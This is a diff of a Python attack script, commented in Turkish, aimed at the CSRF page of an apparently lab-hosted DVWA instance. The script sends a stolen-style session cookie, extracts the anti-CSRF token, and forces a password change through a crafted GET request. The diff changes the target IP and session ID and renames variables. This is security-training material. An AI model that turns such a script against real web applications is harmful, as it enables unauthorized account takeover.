@@ -9,10 +9,10 @@ from bs4 import BeautifulSoup
 
 cookies = {
 	'security': 'high',
-	'PHPSESSID':'796fe5af9504cd94490124de99c046aa'
+	'PHPSESSID':'54ca199796e7d2d65c600e74e13c92e3'
 }
 
-url = 'http://192.168.182.131/dvwa2/vulnerabilities/csrf/'
+url = 'http://10.0.2.7/dvwa2/vulnerabilities/csrf/'
 
 istek = requests.get(url, cookies=cookies)
 
@@ -26,20 +26,16 @@ try:#token varsa
 	tokenDurumu = 1
 except:
 	print("[*] Token tespit edilemedi. Saldırıya devam ediliyor...")
-"""
-Örnek bir GET isteği
-GET /dvwa2/vulnerabilities/brute/index.php?username=admin&password=asd&Login=Login&user_token=6905d0035db25262f4b01ea001cba3d6
-"""
 
-sifre = "beren"
+yeniSifre = "beren"
 
-url = "http://192.168.182.131/dvwa2/vulnerabilities/csrf/?password_new="+ sifre + "&password_conf=" + sifre + "&Change=Change"
+url = "http://10.0.2.7/dvwa2/vulnerabilities/csrf/?password_new="+ yeniSifre + "&password_conf=" + yeniSifre + "&Change=Change"
 if(tokenDurumu):
 	url = url + "&user_token=" + token
 istek = requests.get(url, cookies=cookies)
 
 if(str(istek.content).find("Password Changed.") != -1):
-	print("[*] Şifre değiştirildi yeni şifre:", sifre)
+	print("[*] Şifre değiştirildi yeni şifre:", yeniSifre)
 else:
 	print("[*] Başarısız işlem!")
 
